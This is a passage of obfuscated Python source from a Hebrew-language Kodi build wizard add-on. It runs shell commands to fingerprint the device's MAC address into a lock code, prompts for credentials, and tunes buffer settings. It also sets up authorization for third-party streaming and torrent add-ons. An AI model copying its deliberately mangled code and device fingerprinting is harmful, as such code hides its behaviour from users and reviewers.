       OOOOOO0OO000OOO0O ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1633
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1634
       sys .exit ()#line:1635
    return OOOOOO0OO000OOO0O #line:1636
def disply_hwr ():#line:1638
   try :#line:1639
    O0OO0OOO0O0OO0OO0 =tmdb_list (TMDB_NEW_API )#line:1640
    O00OOO0OOOO0OOOOO =str ((getHwAddr ('eth0'))*O0OO0OOO0O0OO0OO0 )#line:1641
    OO0OOO00OOOO00O00 =(O00OOO0OOOO0OOOOO [1 ]+O00OOO0OOOO0OOOOO [2 ]+O00OOO0OOOO0OOOOO [5 ]+O00OOO0OOOO0OOOOO [7 ])#line:1648
    O0OOOO0OOO00O00O0 =(ADDON .getSetting ("action"))#line:1649
    wiz .setS ('action',str (OO0OOO00OOOO00O00 ))#line:1651
   except :pass #line:1652
def disply_hwr2 ():#line:1653
   try :#line:1654
    OO0O00O0O0OOO000O =tmdb_list (TMDB_NEW_API )#line:1655
    O00OOOO00OO0OOOO0 =str ((getHwAddr ('eth0'))*OO0O00O0O0OOO000O )#line:1657
    O0O0O0O00O0O0O0O0 =(O00OOOO00OO0OOOO0 [1 ]+O00OOOO00OO0OOOO0 [2 ]+O00OOOO00OO0OOOO0 [5 ]+O00OOOO00OO0OOOO0 [7 ])#line:1666
    O0OOOO0OOO0OOO0OO =(ADDON .getSetting ("action"))#line:1667
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0O0O0O00O0O0O0O0 )#line:1670
   except :pass #line:1671
def getHwAddr (O00000OOO0OOO0O00 ):#line:1673
   import subprocess ,time #line:1674
   OOO0OO0OO000OOO0O ='windows'#line:1675
   if xbmc .getCondVisibility ('system.platform.android'):#line:1676
       OOO0OO0OO000OOO0O ='android'#line:1677
   if xbmc .getCondVisibility ('system.platform.android'):#line:1678
     O00000OO000OOOO0O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1679
     OOOO00000OO0O0000 =re .compile ('link/ether (.+?) brd').findall (str (O00000OO000OOOO0O ))#line:1681
     OO0OO0OO0OO0OO00O =0 #line:1682
     for O0OOO0O0000O0OO00 in OOOO00000OO0O0000 :#line:1683
      if OOOO00000OO0O0000 !='00:00:00:00:00:00':#line:1684
          OO00OOOOO00O0OOOO =O0OOO0O0000O0OO00 #line:1685
          OO0OO0OO0OO0OO00O =OO0OO0OO0OO0OO00O +int (OO00OOOOO00O0OOOO .replace (':',''),16 )#line:1686
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1688
       OOOOO000000O000O0 =0 #line:1689
       OO0OO0OO0OO0OO00O =0 #line:1690
       O00OO00O0000O0OOO =[]#line:1691
       O0O00000OOOOO0OO0 =os .popen ("getmac").read ()#line:1692
       O0O00000OOOOO0OO0 =O0O00000OOOOO0OO0 .split ("\n")#line:1693
       for O00OO0OOO000O00O0 in O0O00000OOOOO0OO0 :#line:1695
            OO0000O00O00OO00O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O00OO0OOO000O00O0 ,re .I )#line:1696
            if OO0000O00O00OO00O :#line:1697
                OOOO00000OO0O0000 =OO0000O00O00OO00O .group ().replace ('-',':')#line:1698
                O00OO00O0000O0OOO .append (OOOO00000OO0O0000 )#line:1699
                OO0OO0OO0OO0OO00O =OO0OO0OO0OO0OO00O +int (OOOO00000OO0O0000 .replace (':',''),16 )#line:1702
   else :#line:1704
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1705
   try :#line:1722
    return OO0OO0OO0OO0OO00O #line:1723
   except :pass #line:1724
def getpass ():#line:1725
	disply_hwr2 ()#line:1727
def setpass ():#line:1728
    O000O0OO0O00O0OOO =xbmcgui .Dialog ()#line:1729
    O0OO0OOO000OO0000 =''#line:1730
    OO000O0O00OOOOO0O =xbmc .Keyboard (O0OO0OOO000OO0000 ,'הכנס סיסמה')#line:1732
    OO000O0O00OOOOO0O .doModal ()#line:1733
    if OO000O0O00OOOOO0O .isConfirmed ():#line:1734
           OO000O0O00OOOOO0O =OO000O0O00OOOOO0O .getText ()#line:1735
    wiz .setS ('pass',str (OO000O0O00OOOOO0O ))#line:1736
def setuname ():#line:1737
    OOO0OO0O000O0O000 =''#line:1738
    O0OOO00000OO000O0 =xbmc .Keyboard (OOO0OO0O000O0O000 ,'הכנס שם משתמש')#line:1739
    O0OOO00000OO000O0 .doModal ()#line:1740
    if O0OOO00000OO000O0 .isConfirmed ():#line:1741
           OOO0OO0O000O0O000 =O0OOO00000OO000O0 .getText ()#line:1742
           wiz .setS ('user',str (OOO0OO0O000O0O000 ))#line:1743
def powerkodi ():#line:1744
    os ._exit (1 )#line:1745
def buffer1 ():#line:1747
	OOO000000000O0O0O =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1748
	OO0O0O000O00000OO =xbmc .getInfoLabel ("System.Memory(total)")#line:1749
	OO0O0O0O0OOOOOO00 =xbmc .getInfoLabel ("System.FreeMemory")#line:1750
	O0O00O0000OO0O000 =re .sub ('[^0-9]','',OO0O0O0O0OOOOOO00 )#line:1751
	O0O00O0000OO0O000 =int (O0O00O0000OO0O000 )/3 #line:1752
	OOO0000O00OO0O00O =O0O00O0000OO0O000 *1024 *1024 #line:1753
	try :OO00000O0O0OOOO00 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1754
	except :OO00000O0O0OOOO00 =16 #line:1755
	O00OO00O000OO0OO0 =DIALOG .yesno ('FREE MEMORY: '+str (OO0O0O0O0OOOOOO00 ),'Based on your free Memory your optimal buffersize is: '+str (O0O00O0000OO0O000 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1758
	if O00OO00O000OO0OO0 ==1 :#line:1759
		with open (OOO000000000O0O0O ,"w")as OOO0O000OO00OOOOO :#line:1760
			if OO00000O0O0OOOO00 >=17 :OO00OOO0000O0OO00 =xml_data_advSettings_New (str (OOO0000O00OO0O00O ))#line:1761
			else :OO00OOO0000O0OO00 =xml_data_advSettings_old (str (OOO0000O00OO0O00O ))#line:1762
			OOO0O000OO00OOOOO .write (OO00OOO0000O0OO00 )#line:1764
			DIALOG .ok ('Buffer Size Set to: '+str (OOO0000O00OO0O00O ),'Please restart Kodi for settings to apply.','')#line:1765
	elif O00OO00O000OO0OO0 ==0 :#line:1767
		OOO0000O00OO0O00O =_O0OOO00OO0OOO00O0 (default =str (OOO0000O00OO0O00O ),heading ="INPUT BUFFER SIZE")#line:1768
		with open (OOO000000000O0O0O ,"w")as OOO0O000OO00OOOOO :#line:1769
			if OO00000O0O0OOOO00 >=17 :OO00OOO0000O0OO00 =xml_data_advSettings_New (str (OOO0000O00OO0O00O ))#line:1770
			else :OO00OOO0000O0OO00 =xml_data_advSettings_old (str (OOO0000O00OO0O00O ))#line:1771
			OOO0O000OO00OOOOO .write (OO00OOO0000O0OO00 )#line:1772
			DIALOG .ok ('Buffer Size Set to: '+str (OOO0000O00OO0O00O ),'Please restart Kodi for settings to apply.','')#line:1773
def xml_data_advSettings_old (OO00O0000O0O00OO0 ):#line:1774
	O0O000O0O00O0O000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO00O0000O0O00OO0 #line:1784
	return O0O000O0O00O0O000 #line:1785
def xml_data_advSettings_New (O00OO00O00O0OO0OO ):#line:1787
	OO0000O00000OOOOO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O00OO00O00O0OO0OO #line:1799
	return OO0000O00000OOOOO #line:1800
def write_ADV_SETTINGS_XML (O0OOOOOOO0O0O00OO ):#line:1801
    if not os .path .exists (xml_file ):#line:1802
        with open (xml_file ,"w")as O000O0O0000O0O000 :#line:1803
            O000O0O0000O0O000 .write (xml_data )#line:1804
def _O0OOO00OO0OOO00O0 (default ="",heading ="",hidden =False ):#line:1805
    ""#line:1806
    O000OOO00000OO00O =xbmc .Keyboard (default ,heading ,hidden )#line:1807
    O000OOO00000OO00O .doModal ()#line:1808
    if (O000OOO00000OO00O .isConfirmed ()):#line:1809
        return unicode (O000OOO00000OO00O .getText (),"utf-8")#line:1810
    return default #line:1811
def index ():#line:1813
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1814
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1815
	if AUTOUPDATE =='Yes':#line:1816
		if wiz .workingURL (WIZARDFILE )==True :#line:1817
			O0O0000O00OO0OO00 =wiz .checkWizard ('version')#line:1818
			if O0O0000O00OO0OO00 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0O0000O00OO0OO00 ),'wizardupdate',themeit =THEME2 )#line:1819
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1820
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1821
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1822
	if len (BUILDNAME )>0 :#line:1823
		O00OO00OOO000OO0O =wiz .checkBuild (BUILDNAME ,'version')#line:1824
		O0O0OO000O0O0O00O ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:1825
		if O00OO00OOO000OO0O >BUILDVERSION :O0O0OO000O0O0O00O ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0O0OO000O0O0O00O ,O00OO00OOO000OO0O )#line:1826
		addDir (O0O0OO000O0O0O00O ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:1828
		try :#line:1830
		     O0OOO0000OO0OOO0O =wiz .themeCount (BUILDNAME )#line:1831
		except :#line:1832
		   O0OOO0000OO0OOO0O =False #line:1833
		if not O0OOO0000OO0OOO0O ==False :#line:1834
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:1835
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:1836
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1839
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1840
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1841
	addFile ('אימות חשבון + RD','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1845
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1847
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1849
def morsetup ():#line:1851
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1852
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1853
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:1854
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1855
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1859
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1860
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:1863
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1864
	addFile ('הגדר מצב RD','rdon',icon =ICONMAINT ,themeit =THEME1 )#line:1866
	addFile ('ביטול מצב RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:1867
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1875
	setView ('files','viewType')#line:1876
def morsetup2 ():#line:1877
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:1878
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1879
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1880
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1881
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1882
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1883
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1884
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1885
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1886
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1887
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1888
def fastupdate ():#line:1889
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:1890
def forcefastupdate ():#line:1892
			O000O00OOO0OO000O ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1893
			wiz .ForceFastUpDate (ADDONTITLE ,O000O00OOO0OO000O )#line:1894
def rdsetup ():#line:1898
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.resolveurl)'):#line:1899
		xbmc .executebuiltin ("InstallAddon(script.module.resolveurl)")#line:1900
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.urlresolver)'):#line:1901
		xbmc .executebuiltin ("InstallAddon(script.module.urlresolver)")#line:1902
	addFile ('[COLOR red]ResolverUrl[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','resolveurl',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1903
	addFile ('[COLOR blue]URLResolver[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','urlresolver',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1904
	setView ('files','viewType')#line:1905
def traktsetup ():#line:1907
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1908
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1909
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1910
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1911
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1912
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1913
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1914
	setView ('files','viewType')#line:1915
def resolveurlsetup ():#line:1917
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1918
def urlresolversetup ():#line:1919
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1920
def placentasetup ():#line:1922
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1923
def reptiliasetup ():#line:1924
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1925
def flixnetsetup ():#line:1926
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1927
def yodasetup ():#line:1928
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1929
def numberssetup ():#line:1930
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1931
def uranussetup ():#line:1932
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1933
def genesissetup ():#line:1934
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1935
def net_tools (view =None ):#line:1937
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1938
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1939
	setView ('files','viewType')#line:1941
def speedMenu ():#line:1942
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:1943
def viewIP ():#line:1944
	O0O0OO0O00O000OO0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1958
	OOOOO0OO0O0000O00 =[];O0O0O0O00O000O000 =0 #line:1959
	for OOOOOO0OO0OOO0O00 in O0O0OO0O00O000OO0 :#line:1960
		OO0OOO0O0OOOO00OO =wiz .getInfo (OOOOOO0OO0OOO0O00 )#line:1961
		OOOO00OO00OOO000O =0 #line:1962
		while OO0OOO0O0OOOO00OO =="Busy"and OOOO00OO00OOO000O <10 :#line:1963
			OO0OOO0O0OOOO00OO =wiz .getInfo (OOOOOO0OO0OOO0O00 );OOOO00OO00OOO000O +=1 ;wiz .log ("%s sleep %s"%(OOOOOO0OO0OOO0O00 ,str (OOOO00OO00OOO000O )));xbmc .sleep (1000 )#line:1964
		OOOOO0OO0O0000O00 .append (OO0OOO0O0OOOO00OO )#line:1965
		O0O0O0O00O000O000 +=1 #line:1966
	O000O0O0000O00O00 ,O000O00000OOOOO00 ,OOOO00OOO000O0OOO =getIP ()#line:1967
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0OO0O0000O00 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1968
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0O0000O00O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1969
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00000OOOOO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1970
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO00OOO000O0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1971
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0OO0O0000O00 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1972
	setView ('files','viewType')#line:1973
def buildMenu ():#line:1975
	if USERNAME =='':#line:1976
		ADDON .openSettings ()#line:1977
		sys .exit ()#line:1978
	if PASSWORD =='':#line:1979
		ADDON .openSettings ()#line:1980
	OOOO0000O00000OOO =u_list (SPEEDFILE )#line:1981
	(OOOO0000O00000OOO )#line:1982
	O0OO0000O0OO0O000 =(wiz .workingURL (OOOO0000O00000OOO ))#line:1983
	(O0OO0000O0OO0O000 )#line:1984
	O0OO0000O0OO0O000 =wiz .workingURL (SPEEDFILE )#line:1985
	if not O0OO0000O0OO0O000 ==True :#line:1986
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1987
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1988
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1989
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:1990
		addFile ('%s'%O0OO0000O0OO0O000 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1991
	else :#line:1992
		OOOOO000000O0O0OO ,O000O000OOO0OO0O0 ,O00OO0000OOO0O0O0 ,OOO00O00OO000O000 ,OOO000000O0O000O0 ,O0OO0OOO0OO00OO00 ,OO000O00O0OOO0OOO =wiz .buildCount ()#line:1993
		O00O00OO0OOO000O0 =False ;O0OO0OOOOO000O000 =[]#line:1994
		if THIRDPARTY =='true':#line:1995
			if not THIRD1NAME ==''and not THIRD1URL =='':O00O00OO0OOO000O0 =True ;O0OO0OOOOO000O000 .append ('1')#line:1996
			if not THIRD2NAME ==''and not THIRD2URL =='':O00O00OO0OOO000O0 =True ;O0OO0OOOOO000O000 .append ('2')#line:1997
			if not THIRD3NAME ==''and not THIRD3URL =='':O00O00OO0OOO000O0 =True ;O0OO0OOOOO000O000 .append ('3')#line:1998
		O0O00O0OOOOO0OO0O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:1999
		OOOOOOO0000000OO0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O00O0OOOOO0OO0O )#line:2000
		if OOOOO000000O0O0OO ==1 and O00O00OO0OOO000O0 ==False :#line:2001
			for O000OO00O0O0OO00O ,OO0O00OO0O00OOOOO ,O000OO0OO00O00OOO ,OOO0O00OOOO000O0O ,O00O0O00O0OO0O0OO ,OOOO0O0O00OO0O000 ,OO0O00O0O000O000O ,OOOOO000O0O0O0000 ,OOOO000O00OOO0OOO ,O0O0OO00O00O0OOOO in OOOOOOO0000000OO0 :#line:2002
				if not SHOWADULT =='true'and OOOO000O00OOO0OOO .lower ()=='yes':continue #line:2003
				if not DEVELOPER =='true'and wiz .strTest (O000OO00O0O0OO00O ):continue #line:2004
				viewBuild (OOOOOOO0000000OO0 [0 ][0 ])#line:2005
				return #line:2006
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2009
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2010
		if O00O00OO0OOO000O0 ==True :#line:2011
			for OO0OO0O0O0OOOOO00 in O0OO0OOOOO000O000 :#line:2012
				O000OO00O0O0OO00O =eval ('THIRD%sNAME'%OO0OO0O0O0OOOOO00 )#line:2013
		if len (OOOOOOO0000000OO0 )>=1 :#line:2015
			if SEPERATE =='true':#line:2016
				for O000OO00O0O0OO00O ,OO0O00OO0O00OOOOO ,O000OO0OO00O00OOO ,OOO0O00OOOO000O0O ,O00O0O00O0OO0O0OO ,OOOO0O0O00OO0O000 ,OO0O00O0O000O000O ,OOOOO000O0O0O0000 ,OOOO000O00OOO0OOO ,O0O0OO00O00O0OOOO in OOOOOOO0000000OO0 :#line:2017
					if not SHOWADULT =='true'and OOOO000O00OOO0OOO .lower ()=='yes':continue #line:2018
					if not DEVELOPER =='true'and wiz .strTest (O000OO00O0O0OO00O ):continue #line:2019
					OOO000OOO0O0O0OO0 =createMenu ('install','',O000OO00O0O0OO00O )#line:2020
					addDir ('[%s] %s (v%s)'%(float (O00O0O00O0OO0O0OO ),O000OO00O0O0OO00O ,OO0O00OO0O00OOOOO ),'viewbuild',O000OO00O0O0OO00O ,description =O0O0OO00O00O0OOOO ,fanart =OOOOO000O0O0O0000 ,icon =OO0O00O0O000O000O ,menu =OOO000OOO0O0O0OO0 ,themeit =THEME2 )#line:2021
			else :#line:2022
				if OOO00O00OO000O000 >0 :#line:2023
					OOOOOOOOOOO0O0O00 ='+'if SHOW17 =='false'else '-'#line:2024
					if SHOW17 =='true':#line:2026
						for O000OO00O0O0OO00O ,OO0O00OO0O00OOOOO ,O000OO0OO00O00OOO ,OOO0O00OOOO000O0O ,O00O0O00O0OO0O0OO ,OOOO0O0O00OO0O000 ,OO0O00O0O000O000O ,OOOOO000O0O0O0000 ,OOOO000O00OOO0OOO ,O0O0OO00O00O0OOOO in OOOOOOO0000000OO0 :#line:2028
							if not SHOWADULT =='true'and OOOO000O00OOO0OOO .lower ()=='yes':continue #line:2029
							if not DEVELOPER =='true'and wiz .strTest (O000OO00O0O0OO00O ):continue #line:2030
							OO0O0000OO00O00O0 =int (float (O00O0O00O0OO0O0OO ))#line:2031
							if OO0O0000OO00O00O0 ==17 :#line:2032
								OOO000OOO0O0O0OO0 =createMenu ('install','',O000OO00O0O0OO00O )#line:2033
								addDir ('[%s] %s (v%s)'%(float (O00O0O00O0OO0O0OO ),O000OO00O0O0OO00O ,OO0O00OO0O00OOOOO ),'viewbuild',O000OO00O0O0OO00O ,description =O0O0OO00O00O0OOOO ,fanart =OOOOO000O0O0O0000 ,icon =OO0O00O0O000O000O ,menu =OOO000OOO0O0O0OO0 ,themeit =THEME2 )#line:2034
				if OOO000000O0O000O0 >0 :#line:2035
					OOOOOOOOOOO0O0O00 ='+'if SHOW18 =='false'else '-'#line:2036
					if SHOW18 =='true':#line:2038
						for O000OO00O0O0OO00O ,OO0O00OO0O00OOOOO ,O000OO0OO00O00OOO ,OOO0O00OOOO000O0O ,O00O0O00O0OO0O0OO ,OOOO0O0O00OO0O000 ,OO0O00O0O000O000O ,OOOOO000O0O0O0000 ,OOOO000O00OOO0OOO ,O0O0OO00O00O0OOOO in OOOOOOO0000000OO0 :#line:2040
							if not SHOWADULT =='true'and OOOO000O00OOO0OOO .lower ()=='yes':continue #line:2041
							if not DEVELOPER =='true'and wiz .strTest (O000OO00O0O0OO00O ):continue #line:2042
							OO0O0000OO00O00O0 =int (float (O00O0O00O0OO0O0OO ))#line:2043
							if OO0O0000OO00O00O0 ==18 :#line:2044
								OOO000OOO0O0O0OO0 =createMenu ('install','',O000OO00O0O0OO00O )#line:2045
								addDir ('[%s] %s (v%s)'%(float (O00O0O00O0OO0O0OO ),O000OO00O0O0OO00O ,OO0O00OO0O00OOOOO ),'viewbuild',O000OO00O0O0OO00O ,description =O0O0OO00O00O0OOOO ,fanart =OOOOO000O0O0O0000 ,icon =OO0O00O0O000O000O ,menu =OOO000OOO0O0O0OO0 ,themeit =THEME2 )#line:2046
				if O00OO0000OOO0O0O0 >0 :#line:2047
					OOOOOOOOOOO0O0O00 ='+'if SHOW16 =='false'else '-'#line:2048
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOOOOOOOOOO0O0O00 ,O00OO0000OOO0O0O0 ),'togglesetting','show16',themeit =THEME3 )#line:2049
					if SHOW16 =='true':#line:2050
						for O000OO00O0O0OO00O ,OO0O00OO0O00OOOOO ,O000OO0OO00O00OOO ,OOO0O00OOOO000O0O ,O00O0O00O0OO0O0OO ,OOOO0O0O00OO0O000 ,OO0O00O0O000O000O ,OOOOO000O0O0O0000 ,OOOO000O00OOO0OOO ,O0O0OO00O00O0OOOO in OOOOOOO0000000OO0 :#line:2051
							if not SHOWADULT =='true'and OOOO000O00OOO0OOO .lower ()=='yes':continue #line:2052
							if not DEVELOPER =='true'and wiz .strTest (O000OO00O0O0OO00O ):continue #line:2053
							OO0O0000OO00O00O0 =int (float (O00O0O00O0OO0O0OO ))#line:2054
							if OO0O0000OO00O00O0 ==16 :#line:2055
								OOO000OOO0O0O0OO0 =createMenu ('install','',O000OO00O0O0OO00O )#line:2056
								addDir ('[%s] %s (v%s)'%(float (O00O0O00O0OO0O0OO ),O000OO00O0O0OO00O ,OO0O00OO0O00OOOOO ),'viewbuild',O000OO00O0O0OO00O ,description =O0O0OO00O00O0OOOO ,fanart =OOOOO000O0O0O0000 ,icon =OO0O00O0O000O000O ,menu =OOO000OOO0O0O0OO0 ,themeit =THEME2 )#line:2057
				if O000O000OOO0OO0O0 >0 :#line:2058
					OOOOOOOOOOO0O0O00 ='+'if SHOW15 =='false'else '-'#line:2059
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOOOOOOOOOO0O0O00 ,O000O000OOO0OO0O0 ),'togglesetting','show15',themeit =THEME3 )#line:2060
					if SHOW15 =='true':#line:2061
